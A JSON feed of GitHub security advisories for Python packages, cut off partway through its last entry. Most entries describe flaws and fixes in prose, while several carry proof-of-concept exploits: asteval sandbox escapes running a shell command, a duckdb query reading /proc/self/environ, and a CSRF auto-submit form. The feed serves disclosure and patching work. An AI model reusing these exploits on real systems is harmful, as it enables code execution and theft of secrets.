{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"issue\">Issue</h3>\n<p>Snowflake discovered and remediated a vulnerability in the Snowflake Connector for Python. A function from the snowflake.connector.pandas_tools module is vulnerable to SQL injection.</p>\n<p>This vulnerability affects versions 2.2.5 through 3.13.0. Snowflake fixed the issue in version 3.13.1.</p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>A function from the snowflake.connector.pandas_tools module is not sanitizing all of its arguments, and queries using them are not parametrized. An attacker controlling these arguments could achieve SQL injection by passing crafted input. Any SQL executed that way by an attacker would still run in the context of the current session.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>Snowflake released version 3.13.1 of the Snowflake Connector for Python, which fixes this issue. We recommend users upgrade to version 3.13.1.</p>\n<h3 id=\"additional-information\">Additional Information</h3>\n<p>If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href=\"https://hackerone.com/snowflake?type=team\">Vulnerability Disclosure Policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-2vpq-fh52-j3wv\">https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-2vpq-fh52-j3wv</a></li>\n<li><a href=\"https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1\">https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2vpq-fh52-j3wv\">https://github.com/advisories/GHSA-2vpq-fh52-j3wv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2vpq-fh52-j3wv",
            "title": "[snowflake-connector-python] snowflake-connector-python vulnerable to SQL Injection in write_pandas",
            "date_modified": "2025-01-29T20:50:34.000Z",
            "date_published": "2025-01-29T20:50:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2vpq-fh52-j3wv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"issue\">Issue</h3>\n<p>Snowflake discovered and remediated a vulnerability in the Snowflake Connector for Python. The OCSP response cache uses pickle as the serialization format, potentially leading to local privilege escalation.</p>\n<p>This vulnerability affects versions 2.7.12 through 3.13.0. Snowflake fixed the issue in version 3.13.1.</p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>The OCSP response cache is saved locally on the machine running the Connector using the pickle serialization format. This can potentially lead to local privilege escalation if an attacker has write access to the OCSP response cache file.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>Snowflake released version 3.13.1 of the Snowflake Connector for Python, which fixes this issue. We recommend users upgrade to version 3.13.1.</p>\n<h3 id=\"additional-information\">Additional Information</h3>\n<p>If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href=\"https://hackerone.com/snowflake?type=team\">Vulnerability Disclosure Policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-m4f6-vcj4-w5mx\">https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-m4f6-vcj4-w5mx</a></li>\n<li><a href=\"https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1\">https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m4f6-vcj4-w5mx\">https://github.com/advisories/GHSA-m4f6-vcj4-w5mx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m4f6-vcj4-w5mx",
            "title": "[snowflake-connector-python] snowflake-connector-python vulnerable to insecure deserialization of the OCSP response cache",
            "date_modified": "2025-01-29T20:50:19.000Z",
            "date_published": "2025-01-29T20:50:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m4f6-vcj4-w5mx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"issue\">Issue</h3>\n<p>Snowflake discovered and remediated a vulnerability in the Snowflake Connector for Python. On Linux systems, when temporary credential caching is enabled, the Snowflake Connector for Python will cache temporary credentials locally in a world-readable file.</p>\n<p>This vulnerability affects versions 2.3.7 through 3.13.0. Snowflake fixed the issue in version 3.13.1.</p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>On Linux, when either EXTERNALBROWSER or USERNAME_PASSWORD_MFA authentication methods are used with temporary credential caching enabled, the Snowflake Connector for Python will cache the temporary credentials in a local file. In the vulnerable versions of the Driver, this file is created with world-readable permissions.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>Snowflake released version 3.13.1 of the Snowflake Connector for Python, which fixes this issue. We recommend users upgrade to version 3.13.1.</p>\n<h3 id=\"additional-information\">Additional Information</h3>\n<p>If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href=\"https://hackerone.com/snowflake?type=team\">Vulnerability Disclosure Policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-r2x6-cjg7-8r43\">https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-r2x6-cjg7-8r43</a></li>\n<li><a href=\"https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1\">https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r2x6-cjg7-8r43\">https://github.com/advisories/GHSA-r2x6-cjg7-8r43</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r2x6-cjg7-8r43",
            "title": "[snowflake-connector-python] snowflake-connector-python vulnerable to insecure cache files permissions",
            "date_modified": "2025-01-29T20:50:00.000Z",
            "date_published": "2025-01-29T20:49:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r2x6-cjg7-8r43"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in the <code>download_model_with_test_data</code> function of the onnx/onnx framework, versions before 1.16.2, allow for arbitrary file overwrite due to inadequate prevention of path traversal attacks in malicious tar files. This vulnerability enables attackers to overwrite any file on the system, potentially leading to remote code execution, deletion of system, personal, or application files, thus impacting the integrity and availability of the system. The issue arises from the function's handling of tar file extraction without performing security checks on the paths within the tar file, as demonstrated by the ability to overwrite the <code>/home/kali/.ssh/authorized_keys</code> file by specifying an absolute path in the malicious tar file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5187\">https://nvd.nist.gov/vuln/detail/CVE-2024-5187</a></li>\n<li><a href=\"https://huntr.com/bounties/50235ebd-3410-4ada-b064-1a648e11237e\">https://huntr.com/bounties/50235ebd-3410-4ada-b064-1a648e11237e</a></li>\n<li><a href=\"https://github.com/onnx/onnx/issues/6215\">https://github.com/onnx/onnx/issues/6215</a></li>\n<li><a href=\"https://github.com/onnx/onnx/pull/6145\">https://github.com/onnx/onnx/pull/6145</a></li>\n<li><a href=\"https://github.com/onnx/onnx/commit/1b70f9b673259360b6a2339c4bd97db9ea6e552f\">https://github.com/onnx/onnx/commit/1b70f9b673259360b6a2339c4bd97db9ea6e552f</a></li>\n<li><a href=\"https://github.com/onnx/onnx/commit/3fc3845edb048df559aa2a839e39e95503a0ee34\">https://github.com/onnx/onnx/commit/3fc3845edb048df559aa2a839e39e95503a0ee34</a></li>\n<li><a href=\"https://github.com/onnx/onnx/pull/6222\">https://github.com/onnx/onnx/pull/6222</a></li>\n<li><a href=\"https://github.com/onnx/onnx/releases/tag/v1.16.2\">https://github.com/onnx/onnx/releases/tag/v1.16.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6rq9-53c3-f7vj\">https://github.com/advisories/GHSA-6rq9-53c3-f7vj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6rq9-53c3-f7vj",
            "title": "[onnx] onnx allows Arbitrary File Overwrite in download_model_with_test_data",
            "date_modified": "2025-01-27T23:08:36.000Z",
            "date_published": "2024-06-06T21:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6rq9-53c3-f7vj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"description\">Description</h3>\n<p>The vllm/model_executor/weight_utils.py implements hf_model_weights_iterator to load the model checkpoint, which is downloaded from huggingface. It use torch.load function and weights_only parameter is default value False. There is a security warning on <a href=\"https://pytorch.org/docs/stable/generated/torch.load.html\">https://pytorch.org/docs/stable/generated/torch.load.html</a>, when torch.load load a malicious pickle data it will execute arbitrary code during unpickling.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can be exploited to execute arbitrary codes and OS commands in the victim machine who fetch the pretrained repo remotely.</p>\n<p>Note that most models now use the safetensors format, which is not vulnerable to this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://pytorch.org/docs/stable/generated/torch.load.html\">https://pytorch.org/docs/stable/generated/torch.load.html</a></li>\n<li>Fix: <a href=\"https://github.com/vllm-project/vllm/pull/12366\">https://github.com/vllm-project/vllm/pull/12366</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54\">https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24357\">https://nvd.nist.gov/vuln/detail/CVE-2025-24357</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/pull/12366\">https://github.com/vllm-project/vllm/pull/12366</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/commit/d3d6bb13fb62da3234addf6574922a4ec0513d04\">https://github.com/vllm-project/vllm/commit/d3d6bb13fb62da3234addf6574922a4ec0513d04</a></li>\n<li><a href=\"https://github.com/vllm-project/vllm/releases/tag/v0.7.0\">https://github.com/vllm-project/vllm/releases/tag/v0.7.0</a></li>\n<li><a href=\"https://pytorch.org/docs/stable/generated/torch.load.html\">https://pytorch.org/docs/stable/generated/torch.load.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rh4j-5rhw-hr54\">https://github.com/advisories/GHSA-rh4j-5rhw-hr54</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rh4j-5rhw-hr54",
            "title": "[vllm] vllm: Malicious model to RCE by torch.load in hf_model_weights_iterator",
            "date_modified": "2025-01-27T20:50:30.000Z",
            "date_published": "2025-01-27T20:50:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rh4j-5rhw-hr54"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>uniapi version 1.0.7 introduces code that would execute on import of the module and download a script from a remote URL, and would then execute the downloaded script in a thread. The downloaded script would harvest system information and <code>POST</code> the information to another remote URL. This code was found in the PyPI release artifacts and was not present in the public GitHub repository.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/uniapi/PYSEC-2025-2.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/uniapi/PYSEC-2025-2.yaml</a></li>\n<li><a href=\"https://inspector.pypi.io/project/uniapi/1.0.7/packages/0f/40/c6e06c22bbc22ef45f40bf5a7711763fa08fec4d16b4718d86fd60970131/uniapi-1.0.7.tar.gz/uniapi-1.0.7/uniapi/__init__.py#line.11\">https://inspector.pypi.io/project/uniapi/1.0.7/packages/0f/40/c6e06c22bbc22ef45f40bf5a7711763fa08fec4d16b4718d86fd60970131/uniapi-1.0.7.tar.gz/uniapi-1.0.7/uniapi/__init__.py#line.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gvvw-rr8m-fj76\">https://github.com/advisories/GHSA-gvvw-rr8m-fj76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gvvw-rr8m-fj76",
            "title": "[uniapi] uniapi version 1.0.7 contained an information harvesting script.",
            "date_modified": "2025-01-27T12:30:29.000Z",
            "date_published": "2025-01-27T12:30:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gvvw-rr8m-fj76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If an attacker can control the input to the <code>asteval</code> library, they can bypass asteval's restrictions and execute arbitrary Python code in the context of the application using the library.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability is rooted in how <code>asteval</code> performs handling of <code>FormattedValue</code> AST nodes. In particular, the <a href=\"https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507\"><code>on_formattedvalue</code></a> value uses the <a href=\"https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/\">dangerous format method of the str class</a>, as shown in the vulnerable code snippet below:</p>\n<pre><code class=\"language-py\">    def on_formattedvalue(self, node): # ('value', 'conversion', 'format_spec')\n        \"formatting used in f-strings\"\n        val = self.run(node.value)\n        fstring_converters = {115: str, 114: repr, 97: ascii}\n        if node.conversion in fstring_converters:\n            val = fstring_converters[node.conversion](val)\n        fmt = '{__fstring__}'\n        if node.format_spec is not None:\n            fmt = f'{{__fstring__:{self.run(node.format_spec)}}}'\n        return fmt.format(__fstring__=val)\n</code></pre>\n<p>The code above allows an attacker to manipulate the value of the string used in the dangerous call <code>fmt.format(__fstring__=val)</code>. This vulnerability can be exploited to access protected attributes by intentionally triggering an <code>AttributeError</code> exception. The attacker can then catch the exception and use its <code>obj</code> attribute to gain arbitrary access to sensitive or protected object properties.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the <code>whoami</code> command on the host machine:</p>\n<pre><code class=\"language-py\">from asteval import Interpreter\naeval = Interpreter()\ncode = \"\"\"\n# def lender():\n#     ga\n    \ndef pwn():\n    try:\n        f\"{dict.mro()[1]:'\\\\x7B__fstring__.__getattribute__.s\\\\x7D'}\"\n    except Exception as ga:\n        ga = ga.obj\n        sub = ga(dict.mro()[1],\"__subclasses__\")()\n        importer = None\n        for i in sub:\n            if \"BuiltinImporter\" in str(i):\n                importer = i.load_module\n                break\n        os = importer(\"os\")\n        os.system(\"whoami\")\n\n# pre commit cfb57f0beebe0dc0520a1fbabc35e66060c7ea71, it was required to modify the AST to make this work using the code below\n# pwn.body[0].handlers[0].name = lender.body[0].value # need to make it an identifier so node_assign works\n        \npwn()\n\"\"\"\naeval(code)\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lmfit/asteval/security/advisories/GHSA-3wwr-3g9f-9gc7\">https://github.com/lmfit/asteval/security/advisories/GHSA-3wwr-3g9f-9gc7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24359\">https://nvd.nist.gov/vuln/detail/CVE-2025-24359</a></li>\n<li><a href=\"https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2\">https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2</a></li>\n<li><a href=\"https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507\">https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507</a></li>\n<li><a href=\"https://lucumr.pocoo.org/2016/12/29/careful-with-str-format\">https://lucumr.pocoo.org/2016/12/29/careful-with-str-format</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3wwr-3g9f-9gc7\">https://github.com/advisories/GHSA-3wwr-3g9f-9gc7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3wwr-3g9f-9gc7",
            "title": "[asteval] ASTEVAL Allows Maliciously Crafted Format Strings to Lead to Sandbox Escape",
            "date_modified": "2025-01-25T00:54:52.000Z",
            "date_published": "2025-01-24T18:45:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3wwr-3g9f-9gc7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If an attacker can control the input to the asteval library, they can bypass its safety restrictions and execute arbitrary Python code within the application's context.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability is rooted in how <code>asteval</code> performs attribute access verification. In particular, the <a href=\"https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L565\"><code>on_attribute</code></a> node handler prevents access to attributes that are either present in the <code>UNSAFE_ATTRS</code> list or are formed by names starting and ending with <code>__</code>, as shown in the code snippet below:</p>\n<pre><code class=\"language-py\">    def on_attribute(self, node):    # ('value', 'attr', 'ctx')\n        \"\"\"Extract attribute.\"\"\"\n\n        ctx = node.ctx.__class__\n        if ctx == ast.Store:\n            msg = \"attribute for storage: shouldn't be here!\"\n            self.raise_exception(node, exc=RuntimeError, msg=msg)\n\n        sym = self.run(node.value)\n        if ctx == ast.Del:\n            return delattr(sym, node.attr)\n        #\n        unsafe = (node.attr in UNSAFE_ATTRS or\n                 (node.attr.startswith('__') and node.attr.endswith('__')))\n        if not unsafe:\n            for dtype, attrlist in UNSAFE_ATTRS_DTYPES.items():\n                unsafe = isinstance(sym, dtype) and node.attr in attrlist\n                if unsafe:\n                    break\n        if unsafe:\n            msg = f\"no safe attribute '{node.attr}' for {repr(sym)}\"\n            self.raise_exception(node, exc=AttributeError, msg=msg)\n        else:\n            try:\n                return getattr(sym, node.attr)\n            except AttributeError:\n                pass\n</code></pre>\n<p>While this check is intended to block access to sensitive Python dunder methods (such as <code>__getattribute__</code>), the flaw arises because instances of the <code>Procedure</code> class expose their AST (stored in the <code>body</code> attribute) without proper protection:</p>\n<pre><code class=\"language-py\">class Procedure:\n    \"\"\"Procedure: user-defined function for asteval.\n\n    This stores the parsed ast nodes as from the 'functiondef' ast node\n    for later evaluation.\n\n    \"\"\"\n\n    def __init__(self, name, interp, doc=None, lineno=0,\n                 body=None, args=None, kwargs=None,\n                 vararg=None, varkws=None):\n        \"\"\"TODO: docstring in public method.\"\"\"\n        self.__ininit__ = True\n        self.name = name\n        self.__name__ = self.name\n        self.__asteval__ = interp\n        self.raise_exc = self.__asteval__.raise_exception\n        self.__doc__ = doc\n        self.body = body\n        self.argnames = args\n        self.kwargs = kwargs\n        self.vararg = vararg\n        self.varkws = varkws\n        self.lineno = lineno\n        self.__ininit__ = False\n</code></pre>\n<p>Since the <code>body</code> attribute is not protected by a naming convention that would restrict its modification, an attacker can modify the AST of a <code>Procedure</code> during runtime to leverage unintended behaviour.</p>\n<p>The exploit works as follows:</p>\n<ol>\n<li><p><strong>The Time of Check, Time of Use (TOCTOU) Gadget:</strong></p>\n<p>In the <a href=\"https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L577\">code</a> below, a variable named <code>unsafe</code> is set based on whether <code>node.attr</code> is considered unsafe:</p>\n<pre><code class=\"language-python\">unsafe = (node.attr in UNSAFE_ATTRS or\n          (node.attr.startswith('__') and node.attr.endswith('__')))\n</code></pre>\n</li>\n<li><p><strong>Exploiting the TOCTOU Gadget:</strong></p>\n<p>An attacker can abuse this gadget by hooking any <code>Attribute</code> AST node that is not in the <code>UNSAFE_ATTRS</code> list. The attacker modifies the <code>node.attr.startswith</code> function so that it points to a custom procedure. This custom procedure performs the following steps:</p>\n<ul>\n<li>It replaces the value of <code>node.attr</code> with the string <code>\"__getattribute__\"</code> and returns <code>False</code>.</li>\n<li>Thus, when <code>node.attr.startswith('__')</code> is evaluated, it returns <code>False</code>, which causes the condition to short-circuit and sets <code>unsafe</code> to <code>False</code>.</li>\n<li>However, by that time, <code>node.attr</code> has been changed to <code>\"__getattribute__\"</code>, which will be used in the subsequent <code>getattr(sym, node.attr)</code> call. An attacker can then use the obtained reference to <code>sym.__getattr__</code>to retrieve malicious attributes without needing to pass the <code>on_attribute</code> checks.</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p>The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the <code>whoami</code> command on the host machine:</p>\n<pre><code class=\"language-py\">from asteval import Interpreter\naeval = Interpreter()\ncode = \"\"\"\nga_str = \"__getattribute__\"\ndef lender():\n    a\n    b\ndef pwn():\n    ga = lender.dontcare\n    init = ga(\"__init__\")\n    ga = init.dontcare\n    globals = ga(\"__globals__\")\n    builtins = globals[\"__builtins__\"]\n    importer = builtins[\"__import__\"]\n    importer(\"os\").system(\"whoami\")\n\ndef startswith1(str):\n    # Replace the attr on the targeted AST node with \"__getattribute__\"\n    pwn.body[0].value.attr = ga_str\n    return False    \n\ndef startswith2(str):\n    pwn.body[2].value.attr = ga_str\n    return False    \n\nn1 = lender.body[0]\nn1.startswith = startswith1\npwn.body[0].value.attr = n1\n\nn2 = lender.body[1]\nn2.startswith = startswith2\npwn.body[2].value.attr = n2\n\npwn()\n\"\"\"\naeval(code)\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lmfit/asteval/security/advisories/GHSA-vp47-9734-prjw\">https://github.com/lmfit/asteval/security/advisories/GHSA-vp47-9734-prjw</a></li>\n<li><a href=\"https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2\">https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vp47-9734-prjw\">https://github.com/advisories/GHSA-vp47-9734-prjw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vp47-9734-prjw",
            "title": "[asteval] ASTEVAL Allows Malicious Tampering of Exposed AST Nodes Leads to Sandbox Escape",
            "date_modified": "2025-01-23T22:33:50.000Z",
            "date_published": "2025-01-23T22:33:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vp47-9734-prjw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Via a type confusion bug in the CPython interpreter when using <code>try/except*</code> RestrictedPython could be bypassed.</p>\n<p>We believe this should be fixed upstream in Python itself until that we remove support for <code>try/except*</code> from RestrictedPython.\n(It has been fixed for some Python versions.)</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in version 8.0 by removing support for <code>try/except*</code> clauses</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no workaround.</p>\n<h3 id=\"references\">References</h3>\n<p>none</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-gmj9-h825-chq2\">https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-gmj9-h825-chq2</a></li>\n<li><a href=\"https://github.com/zopefoundation/RestrictedPython/commit/48a92c5bb617a647cffd0dadd4d5cfe626bcdb2f\">https://github.com/zopefoundation/RestrictedPython/commit/48a92c5bb617a647cffd0dadd4d5cfe626bcdb2f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-22153\">https://nvd.nist.gov/vuln/detail/CVE-2025-22153</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gmj9-h825-chq2\">https://github.com/advisories/GHSA-gmj9-h825-chq2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gmj9-h825-chq2",
            "title": "[RestrictedPython] try/except* clauses could allow bypass RestrictedPython via type confusion bug in the CPython interpreter",
            "date_modified": "2025-01-23T23:17:22.000Z",
            "date_published": "2025-01-23T17:19:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gmj9-h825-chq2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Content in filesystem is accessible for reading using <code>sniff_csv</code>, even with <code>enable_external_access=false</code>. </p>\n<h3 id=\"details\">Details</h3>\n<p>During a pentest, a security researcher was able to access environment variable data and other system data by using the <code>sniff_csv</code> function, even though we set <code>enable_external_access</code> to false. </p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-SQL\">SET enable_external_access=false;\nSET lock_configuration=true;\n\nSELECT Columns FROM sniff_csv('/proc/self/environ');\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Provides an attacker with access to filesystem even when access is expected to be disabled and other similar functions do NOT provide access. </p>\n<p>For example <code>select * from read_csv('/proc/self/environ')</code> fails with a permission error. </p>\n<p>There seems to be two vectors to this vulnerability: </p>\n<ol>\n<li>Access to files that should otherwise not be allowed. (We expect <code>Permission Error: Scanning CSV files is disabled through configuration</code> and not to provide any access to the file or even acknowledge that it exists). </li>\n<li>The content from a (non-csv?) file can be read (e.g. <code>/etc/hosts</code>, <code>proc/self/environ</code>, etc) even though that doesn't seem to be the intent of the sniff_csv function (my understanding is it's intending to provide information about the shape of the data, but not provide the data itself).</li>\n</ol>\n<h3 id=\"workaround\">Workaround</h3>\n<p>It is possible to work around the issue by disabling the local file system using the <code>disabled_filesystems</code> setting:</p>\n<pre><code class=\"language-SQL\">SET disabled_filesystems='LocalFileSystem';\nSET lock_configuration=true;\n\nSELECT Columns FROM sniff_csv('/proc/self/environ');\n</code></pre>\n<p>will result in <code>Permission Error: File system LocalFileSystem has been disabled by configuration</code>.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>A fix has been merged into the <code>main</code> branch (<a href=\"https://github.com/duckdb/duckdb/pull/13133\">https://github.com/duckdb/duckdb/pull/13133</a>), and will be released with the next DuckDB release.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/duckdb/duckdb/security/advisories/GHSA-w2gf-jxc9-pf2q\">https://github.com/duckdb/duckdb/security/advisories/GHSA-w2gf-jxc9-pf2q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41672\">https://nvd.nist.gov/vuln/detail/CVE-2024-41672</a></li>\n<li><a href=\"https://github.com/duckdb/duckdb/pull/13133\">https://github.com/duckdb/duckdb/pull/13133</a></li>\n<li><a href=\"https://github.com/duckdb/duckdb/commit/c9b7c98aa0e1cd7363fe8bb8543a95f38e980d8a\">https://github.com/duckdb/duckdb/commit/c9b7c98aa0e1cd7363fe8bb8543a95f38e980d8a</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/duckdb/PYSEC-2024-203.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/duckdb/PYSEC-2024-203.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w2gf-jxc9-pf2q\">https://github.com/advisories/GHSA-w2gf-jxc9-pf2q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w2gf-jxc9-pf2q",
            "title": "[duckdb] sniff_csv provides filesystem access even when enable_external_access is disabled in duckdb",
            "date_modified": "2025-01-21T21:07:56.000Z",
            "date_published": "2025-01-21T21:07:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w2gf-jxc9-pf2q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Cross-site request forgery allows an unauthenticated attacker to hijack the authentication of a logged in user, and use the web API with the same permissions.</p>\n<h3 id=\"details\">Details</h3>\n<p>Security attributes like HttpOnly and SameSite are missing from the session cookie, allowing its use from XHR requests and form submissions.\nThe CodeChecker API endpoints only require the session cookie, they do not require a CSRF token, and missing HTTP headers allow the form submission to succeed (but not XHR). This means that the attacker needs to know the ID of products to edit or delete them, but it does not need knowledge to create new products with the SQLite backend.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>With a superuser logged into CodeChecker.</p>\n<pre><code class=\"language-html\">&lt;html&gt;&lt;body&gt;\n    &lt;form action=\"https://codechecker.example.com/v6.58/Products\" method=\"POST\" enctype=\"text/plain\"&gt;\n        &lt;input type=\"text\" name='[1,\"getProducts\",1,1,{}]' value=''&gt;\n    &lt;/form&gt;\n    &lt;script&gt;document.forms[0].submit()&lt;/script&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n<p>Or the same form attack on any of the applicable endpoints.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability allows an attacker to make requests to CodeChecker as the currently logged in user, including but not limited to adding, removing or editing products. The attacker needs to know the ID of the available products to modify or delete them. The attacker cannot directly exfiltrate data from CodeChecker, due to being limited to form-based CSRF.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Ericsson/codechecker/security/advisories/GHSA-f8c8-4pm7-w885\">https://github.com/Ericsson/codechecker/security/advisories/GHSA-f8c8-4pm7-w885</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53829\">https://nvd.nist.gov/vuln/detail/CVE-2024-53829</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f8c8-4pm7-w885\">https://github.com/advisories/GHSA-f8c8-4pm7-w885</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f8c8-4pm7-w885",
            "title": "[codechecker] Cross-Site Request Forgery in CodeChecker API",
            "date_modified": "2025-01-21T20:25:05.000Z",
